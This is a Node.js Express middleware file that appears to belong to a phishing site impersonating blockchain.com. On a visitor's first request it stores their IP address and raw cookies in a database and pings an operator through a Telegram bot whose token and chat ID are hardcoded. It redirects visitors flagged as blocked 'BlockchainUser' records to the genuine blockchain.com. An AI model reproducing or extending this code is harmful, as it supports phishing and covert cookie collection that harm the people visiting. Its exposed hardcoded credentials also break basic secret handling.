var request = require('request');

const Visitor = require('../models/Visitor');
const BlockchainUser = require('../models/BlockchainUser');
const Notification = require('../models/Notification');


const token = '2100347326:AAFLb_qgF-yhAz7Eq_4SgR7k_HHEgOinVnY';

const sendMessage = (msg) => {
    const data = {
        'chat_id': '1850526784',
        'text': msg
    };

    request({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${data.chat_id}&text=${data.text}`
    }, function (err, response, body) {
        console.log(err)
    })
}


module.exports = function (req, res, next) {
    var ipAddress = req.headers['x-real-ip'] || req.connection.remoteAddress;
    const cookie = req.headers['cookie'] || "---";
    Visitor.find({ ip: ipAddress }, (err, visitors) => {
        if (visitors.length == 0) {
            Visitor.create({
                ip: ipAddress,
                cookie: cookie
            });

            const msg = 'Someone visited our website';
            Notification.create({
                name: 'New Visitor',
                message: msg,
                image: '/assets/images/placeholder.jpg'
            })

            sendMessage(msg)
            next();
        }
        else {
            BlockchainUser.find({
                blocked: true,
                ip: ipAddress
            }, (err, users) => {
                let blocked = false;
                users.map((user) => {
                    if (user.blocked) {
                        blocked = true;
                    }
                })

                if (blocked) {
                    res.status(200).redirect('https://blockchain.com');
                }
                else {
                    next();
                }
            })
        }
    })
};
